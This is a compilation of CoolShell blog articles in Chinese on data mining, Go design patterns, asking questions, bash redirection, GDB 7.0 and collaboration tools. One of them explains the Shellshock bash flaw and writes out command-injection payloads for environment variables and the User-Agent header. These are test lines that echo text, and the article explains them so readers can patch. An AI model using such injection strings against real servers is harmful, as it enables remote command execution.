* 比如，直接就输入“该地址不存在”，“13243234asdfasdi”之类的。这类的地址是可以被我的程序识别出来的。* 还有很难被我的程序所识别出来的。比如：“宇宙路地球小区”之类的。但这类地址可以被人识别出来。* 还有连人都识别不出来的，比如：“北京市东四环中路23号南航大厦5楼540室”，这个地址根本不存在。第二个是真地址，但是因为用户写的不标准，所以很难处理，比如：* 缩写：“建国门外大街” 和 “建外大街”，“中国工商银行”和“工行”……* 错别字：“潮阳门”，“通慧河”……* 颠倒：“东四环中路朝阳公园” 和 “朝阳公园 （靠东四环）” ……* 别名：有的人写的是开发商的小区名“东恒国际”，有的则是写行政的地名“八里庄东里”……这样的例子多得不能再多了。可见数据如果不准确，会增加你处理的难度。有个比喻非常好， **玩数据的就像是在挖金矿一样，如果含金量高，那么，挖掘的难度就小，也就容易出效果，如果含金量低，那么挖掘的难度就大，效果就差** 。上面，我给了两个案例，旨在说明——**1）数据没有大小之分，只有含金量大的数据和垃圾量大的数据之分** 。**2）数据清洗是一件多么重要的工作，这也是一件人肉工作量很大的工作。**
****所以，这个工作最好是在数据产生的时候就一点一滴的完成。有一个观点： **如果数据准确度在60%的时候，你干出来的事，一定会被用户骂！如果数据准确度在80%左右，那么用户会说，还不错！只有数据准确度到了90%的时候，用户才会觉得真牛B。但是从数据准确度从80%到90%要付出的成本要比60% 到 80%的付出大得多得多** 。大多数据的数据挖掘团队都会止步于70%这个地方。因为，再往后，这就是一件相当累的活。#### 数据的业务场景我不知道有多少数据挖掘团队真正意识到了业务场景和数据挖掘的重要关系？ **我们需要知道，根本不可能做出能够满足所有业务的数据挖掘和分析模型** 。推荐音乐视频，和电子商务中的推荐商品的场景完全不一样。电商中，只要你买了一个东西没有退货，那么，有很大的概率我可以相信你是喜欢这个东西的，然后，对于音乐和视频，你完全不能通过用户听了这首歌或是看了这个视频就武断地觉得用户是喜欢这首歌和这个视频的，所以，我们可以看到，推荐算法在不同的业务场景下的实现难度也完全不一样。说到推荐算法，你是不是和我一样，有时候会对推荐有一种感觉—— **推荐就是一种按不同维度的排序的算法** 。我个人以为，就提一下推荐这个东西在某些业务场景下是比较Tricky的，比如，推荐有两种（不是按用户关系和按物品关系这两种），
* 一种是共性化推荐，结果就是推荐了流行的东西，这也许是好 的，但这也许会是用户已知的东西，比如，到了北京，我想找个饭馆，你总是给我推荐烤鸭，我想去个地方，你总是给我推荐天安门故宫天坛（因为大多数人来北京就是吃烤鸭，就是去天安门的），这些我不都知道了嘛，还要你来推荐？另外，共性化的东西通常是可以被水军刷的。* 另一种是一种是个性化推荐，这个需要分析用户的个体喜好，好的就是总是给我我喜欢的，不好的就是也许我的口味会随我的年龄和环境所改变，而且，总是推荐符合用户口味的，不能帮用户发掘新鲜点。比如，我喜欢吃辣的，你总是给我推荐川菜和湘菜，时间长了我也会觉得烦的。**推荐有时并不是民主投票，而是专业用户或资深玩家的建议；推荐有时并不是推荐流行的，而是推荐新鲜而我不知道的** 。你可以看到，不同的业务场景，不同的产品形态下的玩法可能完全不一样，另外，就算是对于同一个电子商务来说，书、手机 和服装的业务形态完全不一样。我之前在Amazon做Demand Forecasting（用户需求预测）——通过历史数据来预测用户未来的需求。* 对于书、手机、家电这些东西，在Amazon里叫Hard Line的产品，你可以认为是“标品”（但也不一定），预测是比较准的，甚至可以预测到相关的产品属性的需求。
* 但是地于服装这样的叫Soft Line的产品，Amazon干了十多年都没有办法预测得很好，因为这类东西受到的干扰因素太多了，比如：用户的对颜色款式的喜好，穿上去合不合身，爱人朋友喜不喜欢…… 这类的东西太容易变了，买得人多了反而会卖不好，所以根本没法预测好，更别Stock/Vender Manager 提出来的“预测某品牌的某种颜色的衣服或鞋子”。对于需求的预测，我发现，长期在这个行业中打拼的人的预测是最准的，什么机器学习都是浮云。机器学习只有在你要面对的是成千上万种不同商品和品类的时候才会有意义。**数据挖掘不是人工智能，而且差得还太远。不要觉得数据挖掘什么事都能干，找到一个合适的业务场景和产品形态，比什么都重要** 。#### 数据的分析结果我看到很多的玩大数据的，基本上干的是数据统计的事，从多个不同的维度来统计数据的表现。最简单最常见的统计就是像网站统计这样的事。比如：PV是多少，UV是多少，来路是哪里，浏览器、操作系统、地理、搜索引擎的分布，等等，等等。唠叨一句，千万不要以为，你一天有十几个T的日志就是数据了，也不要以为你会用Hadoop/MapReduce分析一下日志，这就是数据挖掘了，说得难听一点，你在做的只不过是一个统计的工作。那几个T的Raw Data，基本上来说没什么意义，只能叫日志，连数据都算不上，只有你统计出来的这些数据才是有点意义的，才能叫数据。
当一个用户在面对着自己网店的数据的时候，比如：每千人有5个人下单，有65%的访客是男的，18-24岁的人群有30%，等等。甚至你给出了，你打败了40%同类型商家的这样的数据。作为一个商户，面对这些数据时，大多数人的表现是完全不知道自己能干什么？是把网站改得更男性一点，还是让年轻人更喜欢一点？完全不知道所措。只要你去看一看，你会发现，好些好些的数据分析出来的结果，看上去似乎不错，但是其实完全不知道下一步该干什么？所以，我觉得， **数据分析的结果并不仅仅只是把数据呈现出来，而更应该关注的是通过这些数据后面可以干什么？如果看了数据分析的结果后并不知道可以干什么，那么这个数据分析是失败的。**#### 总结综上所述，下面是我觉得数据挖掘或机器学习最重要的东西：1） **数据的质量** 。分为数据的标准和数据的准确。数据中的杂音要尽量地排除掉。为了数据的质量，大量人肉的工作少不了。2） **数据的业务场景** 。我们不可能做所有场景下的来，所以，业务场景和产品形态很重要，我个人感觉业务场景越窄越好。3） **数据的分析结果** ，要让人能看得懂，知道接下来要干什么，而不是为了数据而数据。搞数据挖掘的人很多，但成功的案例却不多（相比起大量的尝试来说），就目前而言， **我似乎觉得目前的数据挖掘的技术是一种过渡技术，还在摸索阶段。另外，好些数据挖掘的团队搞得业务不业务，技术不技术的，为其中的技术人员感到惋惜** ……
不好意思，我只给出了问题，没有建议，这也说明数据分析中有很多的机会……最后，还要提的一个是“ **数据中的个人隐私问题** ”，这似乎就像那些有悖伦理的黑魔法一样，你要成功就得把自己变得黑暗。是的， **数据就像一个王座一样，像征着一种权力和征服，但登上去的路途一样令人胆颤** 。（全文完）# bash代码注入的安全漏洞作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn!bashbug很多人或许对上半年发生的安全问题“心脏流血”（Heartbleed Bug）事件记忆颇深，这两天，又出现了另外一个“毁灭级”的漏洞——Bash软件安全漏洞。这个漏洞由法国GNU/Linux爱好者Stéphane Chazelas所发现。随后，美国电脑紧急应变中心（US-CERT）、红帽以及多家从事安全的公司于周三（北京时间9月24日）发出警告。 关于这个安全漏洞的细节可参看美国政府计算安全的这两个漏洞披露：CVE-2014-6271 和 CVE-2014-7169。这个漏洞其实是非常经典的“注入式攻击”，也就是可以向 bash注入一段命令，从bash1.14 到4.3都存在这样的漏洞。我们先来看一下这个安全问题的症状。
目录* Shellshock (CVE-2014-6271)   * AfterShock – CVE-2014-7169 （又叫Incomplete fix to Shellshock）   * 原理和技术细节     * bash的环境变量     * bash的函数     * bash的bug   * bash漏洞的影响有多大   * 关于 AfterShock – CVE-2014-7169 测试脚本的解释#### Shellshock (CVE-2014-6271)下面是一个简单的测试：如果你发现上面这个命令在你的bash下有这样的输出，那你就说明你的bash是有漏洞的：Bash is vulnerable!     Bash Test简单地看一下，其实就是向环境变量中注入了一段代码 **echo Bash is vulnerable** 。关于其中的原理我会在后面给出。很快，CVE-2014-6271的官方补丁出来的了——Bash-4.3 Official Patch 25。#### AfterShock – CVE-2014-7169 （又叫Incomplete fix to Shellshock）
但随后，马上有人在Twitter上发贴——说这是一个不完整的fix，并给出了相关的攻击方法。也就是下面这段测试代码（注意，其中的sh在linux下等价于bash）：上面这段代码运行起来会报错，但是它要的就是报错，报错后会在你在当前目录下生成一个echo的文件，这个文件的内容是一个时间文本。下面是上面 这段命令执行出来的样子。这段测试脚本代码相当的诡异，就像“天书”一样，我会在后面详细说明这段代码的原理。#### 原理和技术细节要说清楚这个原理和细节，我们需要从 bash的环境变量开始说起。##### bash的环境变量环境变量大家知道吧，这个不用我普及了吧。环境变量是操作系统运行shell中的变量，很多程序会通过环境变量改变自己的执行行为。在bash中要定义一个环境变量的语法很简单（注：=号的前后不能有空格）：`$ var="hello world"`然后你就可以使用这个变量了，比如：echo $var什么的。但是，我们要知道，这个变量只是一个当前shell的“局部变量”，只在当前的shell进程中可以访问，这个shell进程fork出来的进程是访问不到的。你可以做这样的测试：$ var="hello coolshell"     $ echo $var     hello coolshell     $ bash     $ echo $var
上面的测试中，第三个命令执行了一个bash，也就是开了一个bash的子进程，你就会发现var不能访问了。为了要让shell的子进程可以访问，我们需要export一下：`$ export var="hello coolshell"`这样，这个环境变量就会在其子进程中可见了。如果你要查看一下有哪些环境变量可以在子进程中可见（也就是是否被export了），你可使用 **env** 命令。不过，env命令也可以用来定义export的环境变量。如下所示：`$ env var="hello haoel"`有了这些基础知识还不够，我们还要知道一个基础知识——shell的函数。##### bash的函数在bash下定义一个函数很简单，如下所示：有了上面的环境变量的基础知识后，你一定会想试试这个函数是否可以在子进程中调用，答案当然是不行的。你看，和环境变量是一样的，如果要在子进程中可以访问的话，那么，还是一样的，需要export，export有个参数 -f，意思是export一个函数。如：好了，我讲了这么半天的基础知识，别烦，懂了这些，你才会很容易地理解这两个漏洞是怎么回事。好，现在要进入正题。##### bash的bug
从上面我们可以看到，bash的变量和函数用了一模一样的机制，如果你用env命令看一下export出来的东西，你会看到上面我们定义的变量和函数都在，如下所示（我省略了其它的环境变量）：原来，都用同样的方式啊—— **无论是函数还是变量都是变量啊** 。于是，看都不用看bash的源代码，聪明的黑客就能猜得到—— **bash判断一个环境变量是不是一个函数，就看它的值是否以”()”开始** 。于是，一股邪念涌上心头。黑客定义了这样的环境变量（注：() 和 { 间的空格不能少）：env一下，你会看到X已经在了：然后， **当我们在当前的bash shell进程下产生一个bash的子进程时，新的子进程会读取父进程的所有export的环境变量，并复制到自己的进程空间中，很明显，上面的X变量的函数的后面还注入了一条命令：echo “outside X”，这会在父进程向子进程复制的过程中被执行吗？** （关于fork相关的东西你可以看一下我以前写的《fork的一个面试题》）答案是肯定的。你看，一个代码注入就这样完成了。这就是bash的bug—— **函数体外面的代码被默认地执行了** 。我们并不一定非要像上面那样创建另一个bash的子进程，我们可以使用bash -c的参数来执行一个bash子进程命令。就像这个安全漏洞的测试脚本一样：
其中，() { :;} 中的冒号就相当于/bin/true，返回true并退出。而bash -c其实就是在spawn一个bash的echo的子进程，用于触发函数体外的echo命令。所以，更为友好一点的测试脚本应该是：`env VAR='() { :;}; echo Bash is vulnerable!' bash -c "echo 如果你看到了vulnerable字样说明你的bash有安全问题"`OK，你应该明白这个漏洞是怎么一回事了吧。#### bash漏洞的影响有多大在网上看到好多人说这个漏洞不大，还说这个事只有那些陈旧的执行CGI脚本的网站才会有，现在已经没有网站用CGI了。我靠，这真是无知者无畏啊。我举个例子，如果你的网站中有调用操作系统的shell命令，比如你用PHP执行个exec之类的东西。这样的需求是有的，特别是对于一些需要和操作系统交互的重要的后台用于系统管理的程序。于是就会开一个bash的进程来执行。我们还知道，现在的HTTP服务器基本上都是以子进程式的，所以，其中必然会存在export 一些环境变量的事，而有的环境变量的值是从用户端来的，比如：HTTP_USER_AGENT这样的环境变量，只由浏览器发出的。其实这个变量你想写成什么就写成什么。
于是，我可以把这个HTTP_USER_AGENT的环境变量设置成上述的测试脚本，只不过，我会把echo Bash is vulnerable!这个东西换成别的更为凶残的命令。呵呵。关于这个漏洞会影响哪些已有的系统，你可以自己Google，几乎所有的报告这个漏洞的文章都说了（比如：这篇，这篇），我这里就不复述了。注：如果你要看看你的网站有没有这样的问题，你可以用这个在线工具测试一下：‘ShellShock’ Bash Vulnerability CVE-2014-6271 Test Tool。现在，你知道这事可能会很大了吧。还不赶快去打补丁。（注，yum update bash 把bash版本升级到 4.1.2-15.el6_5.2 ， ）#### 关于 AfterShock – CVE-2014-7169 测试脚本的解释很多同学没有看懂下面这个测试脚本是什么意思，我这里解释一下。* X='() { (a)=>\’ 这个不用说了，定义一个X的环境变量。但是，这个函数不完整啊，是的，这是故意的。另外你一定要注意，\’不是为了单引号的转义，X这个变量的值就是 **() { (a)= >\*** 其中的 (a)=这个东西目的就是为了让bash的解释器出错（语法错误）。
* 语法出错后，在缓冲区中就会只剩下了 “>\”这两个字符。* 于是，这个神奇的bash会把后面的命令echo date换个行放到这个缓冲区中，然后执行。相当于在shell 下执行了下面这个命令：$ >\     echo date如果你了解bash，你会知道 \ 是用于命令行上换行的，于是相当于执行了：` $ >echo date`这不就是一个重定向么？上述的命令相当于：`$ date > echo `于是，你的当前目录下会出现一个echo的文件，这个文件的内容就是date命令的输出。**能发现这个种玩法的人真是个变态，完全是为bash的源代码量身定制的一个攻击** 。（全文完）# Go编程模式：委托和反转控制作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn图片来源：GopherSource反转控制IoC – Inversion of Control 是一种软件设计的方法，其主要的思想是把控制逻辑与业务逻辑分享，不要在业务逻辑里写控制逻辑，这样会让控制逻辑依赖于业务逻辑，而是反过来，让业务逻辑依赖控制逻辑。在《IoC/DIP其实是一种管理思想》中的那个开关和电灯的示例一样，开关是控制逻辑，电器是业务逻辑，不要在电器中实现开关，而是把开关抽象成一种协议，让电器都依赖之。这样的编程方式可以有效的降低程序复杂度，并提升代码重用。
### 本文是全系列中第4 / 10篇：Go编程模式* Go编程模式：切片，接口，时间和性能   * Go 编程模式：错误处理   * Go 编程模式：Functional Options   * Go编程模式：委托和反转控制   * Go编程模式：Map-Reduce   * Go 编程模式：Go Generation   * Go编程模式：修饰器   * Go编程模式：Pipeline   * Go 编程模式：k8s Visitor 模式   * Go编程模式 ： 泛型编程« 上一篇文章下一篇文章 »面向对象的设计模式这里不提了，我们来看看Go语言使用Embed结构的一个示例。目录* 嵌入和委托     * 结构体嵌入     * 方法重写     * 嵌入结构多态   * 反转控制     * 实现Undo功能     * 反转依赖#### 嵌入和委托##### 结构体嵌入在Go语言中，我们可以很方便的把一个结构体给嵌到另一个结构体中。如下所示：type Widget struct {     X, Y int     }     type Label struct {     Widget        // Embedding (delegation)     Text   string // Aggregation     }
上面的示例中，我们把 `Widget`嵌入到了 `Label` 中，于是，我们可以这样使用：label.X = 11     label.Y = 12如果在 `Label` 结构体里出现了重名，就需要解决重名，例如，如果 成员 `X` 重名，用 `label.X`表明 是自己的`X` ，用 `label.Wedget.X` 表示嵌入过来的。有了这样的嵌入，就可以像UI组件一样的在结构构的设计上进行层层分解。比如，我可以新出来两个结构体 `Button` 和 `ListBox`：type ListBox struct {     Widget          // Embedding (delegation)     Texts  []string // Aggregation     Index  int      // Aggregation     }##### 方法重写然后，我们需要两个接口 `Painter` 用于把组件画出来，`Clicker` 用于表明点击事件：当然，* 对于 `Lable` 来说，只有 `Painter` ，没有`Clicker`   * 对于 `Button` 和 `ListBox`来说，`Painter` 和`Clicker`都有。
下面是一些实现：//因为这个接口可以通过 Label 的嵌入带到新的结构体，     //所以，可以在 Button 中可以重载这个接口方法以     func (button Button) Paint() { // Override     fmt.Printf("Button.Paint(%s)\n", button.Text)     }     func (button Button) Click() {     fmt.Printf("Button.Click(%s)\n", button.Text)     }这里，需要重点提示一下， **`Button.Paint()` 接口可以通过 Label 的嵌入带到新的结构体，如果 `Button.Paint()` 不实现的话，会调用 `Label.Paint()` ，所以，在 `Button` 中声明 `Paint()` 方法，相当于Override**。##### 嵌入结构多态通过下面的程序可以看到，整个多态是怎么执行的。我们可以看到，我们可以使用接口来多态，也可以使用 泛型的 `interface{}` 来多态，但是需要有一个类型转换。
#### 反转控制我们再来看一个示例，我们有一个存放整数的数据结构，如下所示：其中实现了 `Add()` 、`Delete()` 和 `Contains()` 三个操作，前两个是写操作，后一个是读操作。##### 实现Undo功能现在我们想实现一个 Undo 的功能。我们可以把把 `IntSet` 再包装一下变成 `UndoableIntSet` 代码如下所示：type UndoableIntSet struct { // Poor style     IntSet    // Embedding (delegation)     functions []func()     }在上面的代码中，我们可以看到* 我们在 `UndoableIntSet` 中嵌入了`IntSet` ，然后Override了 它的 `Add()`和 `Delete()` 方法。   * `Contains()` 方法没有Override，所以，会被带到 `UndoableInSet` 中来了。   * 在Override的 `Add()`中，记录 `Delete` 操作   * 在Override的 `Delete()` 中，记录 `Add` 操作   * 在新加入 `Undo()` 中进行Undo操作。
通过这样的方式来为已有的代码扩展新的功能是一个很好的选择，这样，可以在重用原有代码功能和重新新的功能中达到一个平衡。但是，这种方式最大的问题是，Undo操作其实是一种控制逻辑，并不是业务逻辑，所以，在复用 Undo这个功能上是有问题。因为其中加入了大量跟 `IntSet` 相关的业务逻辑。##### 反转依赖现在我们来看另一种方法：我们先声明一种函数接口，表现我们的Undo控制可以接受的函数签名是什么样的：type Undo []func()有了上面这个协议后，我们的Undo控制逻辑就可以写成如下：这里你不必觉得奇怪， `Undo` 本来就是一个类型，不必是一个结构体，是一个函数数组也没什么问题。然后，我们在我们的IntSet里嵌入 Undo，然后，再在 `Add()` 和 `Delete()` 里使用上面的方法，就可以完成功能。这个就是控制反转，不再由 控制逻辑 `Undo` 来依赖业务逻辑 `IntSet`，而是由业务逻辑 `IntSet` 来依赖 `Undo` 。其依赖的是其实是一个协议，这个协议是一个没有参数的函数数组。我们也可以看到，我们 Undo 的代码就可以复用了。（全文完）
# 你会问问题吗？作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn在工作和生活中，总是会有很多人问题我很多技术方面的问题。有一些时候，问问题的和答问题的总是会有一些不爽的事情发生。如下面的几种情况：* 比如：“我的电脑老是蓝屏，怎么办？”，通常这样的问题90%以上的回答是：“重装吧”。这让问问题的人感到很沮丧，但你不能不承认那不是答案。而且有时候让人无法解答，比如：“我的makefiel出错了，你帮我看看我的makfile”，我通常会非反问，报了什么错吗？   * 另一种情况是，回答问题的人首先先对问问题的人的抱怨，你问的问题就不对，或是，你问的这个问题是什么意思，而导致问问题的人却在不停地解释，结果花了好长时间来讨论问题本身是什么。   * 还有一种情况是，问的问题太简单了甚至太白痴了，比如你自己试一试或是读读文档就知道了的问题，或是问这个问题直接表明了你的无知或是懒惰。这种问题会相当影响别人对你的印象。   * 第四种情况是，提问者滔滔不绝，扯这扯那，讲了一大堆，听得听累了。最后都不知道你要干什么。所以，怎么去问问题，怎么问一个好的问题，是一个很重要的事。你提问的技术直接关系到了你是否能够很快得到你满意的答案。
这里有一篇文章推荐给大家《How To Ask Questions The Smart Way》，中文版在这里《提问的智慧》，我把其中的几个亮点总结如下：* 提问前先自己尝试查找答案，读读文档、手册，看看有没有相似的问题，看看那些方法能不能帮你解决问题，自己去试一试。如果你是程序员，你应该先学会自己调查一下源代码。（不然，人家回答你的一定是——RTFM – Read The Fucking Manual）这样的问题很多。我有时候很不愿意回答这样的问题，因为我觉得问问题的人把我当成了他的小跟班了。* 提问的时候，找正确的人或是正确的论坛发问。向陌生人或是不负责的人提问可能会是很危险的。不正确的人，会让你事倍功半。如果你问Linux的人Windows太慢怎么办？他们一定会让你把Windows删了装Linux去的。* 问的问题一定要是很明确的，并且阐述你做了哪些尝试，你一定要简化你的问题，这样可以让你的问题更容易被回答。对于一些问题，最好提供最小化的重现问题的步骤。* 你一定要让问题变得简单易读，这和写代码是一样的。只有简单易读的邮件，人们才会去读，试想看到一封巨大无比的邮件，读邮件的心情都没有了。而且，内容越多，可能越容易让人理解错了。
* 你问问题的态度应该是以一种讨论的态度，即不是低三下四，也不是没有底气。只有这样，你和你的问题才能真正被人看得起。要达到这个状态，不想让别人看不起你，你就一定需要自己去做好充足的调查。问题 问得好的话，其实会让人觉得你很有经验的，能想到别人想不到的地方。* 不要过早下结论。比如：“我这边的程序不转了，我觉得是你那边的问题，你什么时候能fix？”，或是“太难调试了，gdb怎么这么烂？！”。当你这么做的时候，你一定要有足够的信息和证据，否则，你就显得很自大。好的问题应该是，“我和你的接口的程序有问题，我输入了这样的合法的参数，但是XX函数却总是返回失败，我们能一起看看吗？”，“我看了一下gdb的文档，发现我在用XXX命令调试YYY的时候，有这样ZZZ的问题，是不是我哪里做错了？”（全文完）# bash 函数级重定向作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn!bash 函数级重定向相信每一个人对于操作系统的重定向不会陌生了。就是>, >>, <, <<，关于重定向的基本知识我就不说了。这里主要讨论bash的重定向中的一个鲜为人知的东西，那就是bash脚本的函数也可以定义相关的重定向操作。这可不是命令级的重定向，这是函数级的重点向。这并不是一个新的东西，我只是想告诉大家一个已经存在了多年但却可能不被人常用的功能。
关于bash的这个函数级的重定向的语法其实很简单，你只需要在函数结尾时加上一些重定向的定义或指示符就可以了。下面是一个示例：现在，只要是test被调用，那么，这个函数就会从mytest.in读入数据，并把输出重定向到mytest.out文件中，然后标准错误则输出到mytest.err文件中。是不是很简单？因为函数级的重定向仅当在被函数调用的时候才会起作用，而且其也是脚本的一部分，所以，你自然也可以使用变量来借文件名。下面是一个示例：#!/bin/bashout=mytest1.out     mytest     out=mytest2.out     mytest这样一来，标准输出的重定向就可以随$out变量的改变而改变了。在上面的例子中，第一个调是重定向到mytest1.out，第二个则是到mytest2.out。$ bash mytest.sh; more mytest?.out     ::::::::::::::     mytest1.out     ::::::::::::::     Hello World CoolShell.cn     ::::::::::::::     mytest2.out     ::::::::::::::     Hello World CoolShell.cn
正如前面所说的一样，这里并没有什么新的东西。上面的这个示例，转成传统的写法是：#!/bin/bash到此为此，好像这个feature并没有什么特别的实用之处。有一个可能比较实用的用法可能是把把你所有代码的的标准错误重定向到一个文件中去。如下面所示：#!/bin/bashmain运行上面的脚本，你可以得到下面的结果：$ bash mytest.sh ;cat err.log     mytest1 hello1 world1 coolshell.cn     mytest2 hello2 world2 coolshell.cn当然，你也可以不用定义一个函数，只要是{…} 语句块，就可以使用函数级的重定向，就如下面的示例一样：#!/bin/bash你也可以重定向 (…) 语句块，但那会导致语句被执行于一个sub-shell中，这可能会导致一些你不期望的行为或问题，因为sub- shell是在另一个进程中。如果你问，我们是否可以覆盖函数级的重定向。答案是否定的。如果你试图这样做，那么，函数调用点的重定向会首先执行，然后函数定义上的重定向会将其覆盖。下面是一个示例：#!/bin/bash运行结果是，out2.txt会被建立，但里面什么也没有。
下面是一个重定向标准输入的例子：#!/bin/bash下面是其运行结果：$ bash mytest.sh     hello     coolshell.cn(全文完)# GDB 7.0 发布作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn2009年10月06日，GDB7.0正式发布，新的版本你可以在这里下载。本次版本，不但有大家所关注的《GDB回溯调试技术》，同样还有其它大量的新特性，和对新平台的支持。新版的GDB7.0支持如下新的平台或配置：* x86/x86_64 Darwin   * x86_64 MinGW   * Lattice Mico32   * x86/x86_64 DICOS   * S+core 3   * The remote stub now supports x86 Windows CE其主要的新加入的功能有：（看上去相当地高科技啊，很多术语都不知道怎么翻译，请注意后面的相关解释）* Python 脚本调试   * 回溯调试，调式过程记录并重演。   * 不间隔调试。 Non-stop debugging   * 并行调试。 Multi-architecture debugging   * 多进程调试。Multi-inferior, multi-process debugging
> **注释：** > >   * Non-stop 的意思是，当我们在调试一个进程中的某一个或某一些线程时，可以让没有被调试的线程继续运行不停止。 >   * Multi-architecture在字面上理解是多层架构，但应该是关于并行方面的（请大家指正），比如MIPS或SPARC等并行编程方面的。 >   * Multi-inferior的意思是，你可以同时调试多个不同的进程。在某些情况下，这会更容易帮助我们了解程序的内部执行情况。 >当然，本版本也包括了下面的一些改进和补丁：* GDB 为JIT 提供了一个编译接口   * Tracepoints 可以加上条件   * 支持多字节和宽字符   * 为”disassemble”新增加/r 和/m 参数   * 对共享库的自动获取   * 支持内联函数   * 新的远程协议包   * GDB 开始可以读取压缩调试片段   * 在Tru64平台下支持线程切换   * 支持Ada 任务切换   * gdbserver的新功能 ——GDB remote stub   * 一个新的命令，当有系统调用发生时可以停止正在运行的程序(全文完)# 聊聊团队协同和协同工具
作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn这两天跟 Cali 和 Rather 做了一个线上的 Podcast – Ep.5 一起聊聊团队协同。主要是从 IM 工具扩展开来聊了一下团队的协同和相应的工具，但是聊天不是深度思考，有一些东西我没有讲透讲好，所以，我需要把我更多更完整更结构化的想法形成文字。（注：聊天聊地比较详细，本文只是想表达我的主要想法）目录* 国内外的企业 IM 的本质差别     * 企业管理     * 企业文化     * 小结   * 什么是好的协同工具   * 结束语#### 国内外的企业 IM 的本质差别国内企业级在线交流工具主要有：企业微信、钉钉、飞书，国外的则是：Slack、Discord这两大IM工具，你会发现，他们有很多不一样的东西， **其中有两个最大的不同，一个是企业管理，一个是企业文化。**##### 企业管理**Slack/Discrod 主要是通过建 Channel ，而国内的IM则主要是拉群** 。你可能会说，这不是一样的吗？其实是不一样的，很明显，Channel 的属性是相对持久的，而群的属性则是临时的，前者是可以是部门，可以是团队，可以是项目，可以是产品，可以是某种长期存在的职能（如：技术分享），而拉群则是相对来说临时起意的，有时候，同样的人群能被重复地拉出好几次，因为之前临时起意的事做完了，所以群就被人所遗忘了，后面再有事就再来。 **很明显，Channel 这种方式明显是有管理的属性的，而拉群则是没有管理的** 。
所以，在国内这种作坊式，野蛮粗放式的管理风格下，他们需要的就是想起一出是一出的 IM 工具，所以，拉群就是他们的工作习惯，因为没有科学的管理，所以没有章法，所以，他们不需要把工作内的信息结构化的工具。而国外则不然，国外的管理是精细化的，国外的公司还在重度使用 Email 的通讯方式，而 Email 是天生会给一个主题时行归类，而且 Email 天生不是碎片信息，所以，国外的 IM 需要跟 Email 竞争，因为像 Email 那样给邮件分类，把信息聚合在一个主题下的方式就能在 IM 上找到相关的影子。Channel 就是一个信息分类，相当于邮件分类，Slack 的 回复区和 Discord 的子区就像是把同一个主题信息时行聚合的功能。这明显是懂管理的人做的，而国内的拉群一看就是不懂管理的人干的，或者说是就是满足这些不懂管理的人的需求的。##### 企业文化团队协作和团队工作最大的基石是信任，如果有了信任，没有工具都会很爽，如果没有信任，什么工具都没用。信任是一种企业文化，这种文化不仅包括同级间的，还包括上下级间的。但是，因为国内的管理跟不上，所以，就导致了各种不信任的文化，而需要在这里不信任的文化中进行协同工作，国内的 IM 软件就会开发出如下在国外的 IM 中完全没有的功能：
* **监控员工** 。获取员工的工作时间以及工作位置。   * **有详细的已读标注** 。这样会给对方要回复的压力。   * **发出的信息不能修改，不能删除，非常有限地可撤回** 。而国外的 IM 则是，发出的信息可以修改/删除，没有已读标准，也不会监控员工。这种时候，我总是会对工作在这种不信任文化中人感到可怜……如果大家需要靠逼迫的方式把对方拉来跟我一起协作，我们还工作个什么劲啊。##### 小结所以，我们可以看到， **畸形的企业管理和企业文化下，就会导致畸形的协同工具** 。最令人感到悲哀的是，有好多同学还觉得国内的钉钉非常之好，殊不知，你之所以感觉好用，是因为你所在的环境是如此的不堪。你看， **人到了不同的环境就会有不同的认识，所以，找一个好一些的环境对一个人的成长有多重要** 。给一些新入行的人的建议就是，一个环境对一个人的认知会有非常大的影响，找一个好的环境是非常重要，如果不知道什么 环境是好的，那就先从不使用钉钉为工作协同软件的公司开始吧……#### 什么是好的协同工具我们从上面可以得到，协同的前提条件是你需要有一个基于信任的企业文化，还需要有有结构化思维的科学的管理思维。没有这两个东西，给你的团队再多的工具都不可能有真正好有协同的，大家就是装模作样罢了。
假设我们的管理和文化都没有问题，那下面我们来谈谈协同工具的事。我个人觉得 IM 这种工具包括会议都不是一种好的协同工具，因为这些工具都无法把信息做到真正的结构化和准确化，用 IM 或是开会上的信息大多都是碎片化严重，而且没有经过深度思考或是准备的，基本都是即兴出来的东西，不靠谱的概率非常大。找人交流和开会不是有个话题就好的，还需要一个可以讨论的“议案”。在 Amazon 里开会，会前，组织方会把要讨论的方案打印出来给大家看，这个方案是深思过的，是验证过的，是有数据和证据或是引用支撑的，会议开始后，10 -15分钟是没有人说话的，大家都在看文档，然后就开始直接讨论或发表意见，支持还是不支持，还是有条件支持……会议效率就会很高。但是这个议案其实是可以由大家一起来完成的，所以，连打印或是开会都不需要。试想一下，使用像 Google Doc 这样的协同文档工具，把大家拉到同一个文档里直接创作，不香吗？我在前段时间，在公网上组织大家来帮我完成一个《非常时期的囤货手册》，这篇文章的形成有数百个网友的加持，而我就是在做一个主编的工作，这种工作是 IM 工具无法完成的事。与之类似的协同工具还有大家一起写代码的 Github，大家一起做设计的 Figma……这样创作类的协同工具非常多。另外，好多这些工具都能实时展示别人的创作过程，这个简直是太爽了，你可以通过观看他人创作过程，学习到很多他人的思路和想法，这个在没有协同工具的时代是很难想像的。
好的协同工具是可以互相促进互相激励的，就像一个足球队一样，当你看到你的队友在勇敢地争抢，拼命地奔跑，你也会被感染到的。所以， **好的协同就是能够跟一帮志同道合，有共同目标，有想法，有能力的人一起做个什么事** 。 **所以，在我心中我最喜欢的协同工具从来都是创作类的，不是管理类的，更不是聊天类的。** 管理和聊天的协同软件会让你产生一种有产出的假象，但其实不同，这种工具无论做的有多好，都是支持性的工具，不是产出类的工具，不会提升生产力的。另外，在创作类的协同工具上如果有一些智能小帮手，如：Github 发布的 Copilot。那简直是让人爽翻天了，所以，真正能提升生产力的工具都是在内容上帮得到你的。#### 结束语我其实并不喜欢今天所有的 IM 工具，因为我觉得信息不是结构化的，信息是有因果关系和上下文的，是结构化的，是多维度的，不是今天这种线性的方式，我们想像一下“脑图”或是知识图，或是 wikipedia 的网关的关联，我们可能就能想像得到一个更好的 IM 应该是什么 样的……协同工作的想像空间实在是太大了，我觉得所有的桌面端的软件都会被协作版的重写，虽然，这种协作软件需要有网络的加持，但是协作软件的魅力和诱惑力实在的太大了，让人无法不从……
